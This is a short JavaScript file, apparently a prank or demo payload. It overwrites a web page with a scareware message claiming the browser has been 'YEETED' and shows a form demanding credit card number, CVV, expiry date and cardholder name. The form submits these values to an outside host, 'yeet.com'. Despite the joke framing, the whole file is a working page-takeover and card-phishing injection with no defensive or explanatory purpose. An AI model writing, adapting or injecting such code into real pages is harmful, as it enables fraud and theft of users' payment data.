

//alert("hello")



let html = document.querySelector('html')


html.innerHTML = `
<h1>Your browser has been YEETED</h1>
<h2>Enter your credit card info to get it back</h2>

<form action="yeet.com" method="POST">
    <label for="cardNum">card number</label>
    <input type="number" name="cardNum"><br>
    
    <label for="cvv">CVV</label>
    <input type="number" name="cvv"><br>

    <label for="exDate">Expiration date (mm/yy)</label>
    <input type="text" name="exDate"><br>

    <label for="holdername">Cardholder Name</label>
    <input type="text" name="holdername"><br>

    <input type="submit" name="submit">
</form>
`


html.style = `
background-color:white;
text-align:center;
`


let header = document.querySelector('h1')

header.style= "color:purple;"

for( i of document.querySelectorAll('input') ){
    i.style = 'margin-bottom:10px;'
}
